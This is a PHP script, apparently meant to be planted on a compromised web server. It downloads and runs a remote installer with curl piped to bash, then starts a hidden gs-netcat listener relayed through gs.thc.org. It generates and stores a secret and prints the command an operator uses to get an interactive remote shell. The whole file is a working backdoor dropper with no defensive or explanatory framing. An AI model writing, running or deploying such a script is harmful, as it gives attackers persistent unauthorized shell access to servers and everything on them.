<?php
/**
 * gsx.php — final
 *
 * 在目标端：安装 gsocket + 以监听模式启动 + 输出连接命令
 */

error_reporting(E_ALL);
@set_time_limit(0);
header('Content-Type: text/plain; charset=utf-8');

$WORKDIR = sys_get_temp_dir() . '/.gsx_' . substr(md5(__FILE__), 0, 8);
$BIN     = $WORKDIR . '/gs-netcat';
$KEY     = $WORKDIR . '/.secret';
$GS_HOST = 'gs.thc.org';

if (!is_dir($WORKDIR)) @mkdir($WORKDIR, 0700, true);

function sh($c) { return function_exists('shell_exec') ? (string)@shell_exec($c . ' 2>&1') : ''; }

/* 1. Install via /x */
sh('bash -c "$(curl -fsSL https://gsocket.io/x)"');

/* 2. Cari binary */
if (!is_file($BIN)) {
    foreach (['/usr/local/bin/gs-netcat', '/usr/bin/gs-netcat'] as $p) {
        if (is_file($p)) { $BIN = $p; break; }
    }
}
if (!is_file($BIN)) { die("ERROR: gs-netcat not found\n"); }
@chmod($BIN, 0755);

/* 3. Generate secret kalau belum ada */
$secret = is_file($KEY) ? trim(@file_get_contents($KEY)) : '';
if (!preg_match('/^[A-Za-z0-9]{16}$/', $secret)) {
    $secret = '';
    $alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for ($i = 0; $i < 16; $i++) $secret .= $alpha[random_int(0, 61)];
    @file_put_contents($KEY, $secret, LOCK_EX);
}

/* 4. Kill listener lama, spawn listener baru dengan -l -i */
sh('pkill -f "gs-netcat.*' . $secret . '" 2>/dev/null');
usleep(500000);

$listen = escapeshellarg($BIN) . ' -l -i -s ' . escapeshellarg($secret) . ' > /dev/null 2>&1 &';
sh($listen);
usleep(1000000);

/* 5. Verifikasi proses */
$pid = trim(sh('pgrep -f "gs-netcat.*' . escapeshellarg($secret) . '" 2>/dev/null | head -1'));

/* 6. Output */
echo "============================================\n";
echo " GSOCKET LISTENER ACTIVE\n";
echo "============================================\n\n";
echo "SECRET : $secret\n";
echo "PID    : " . ($pid ?: 'NOT RUNNING') . "\n";
echo "BIN    : $BIN\n\n";
echo "CONNECT FROM YOUR MACHINE:\n\n";
echo "  gs-netcat -i $secret\n\n";
echo "============================================\n";
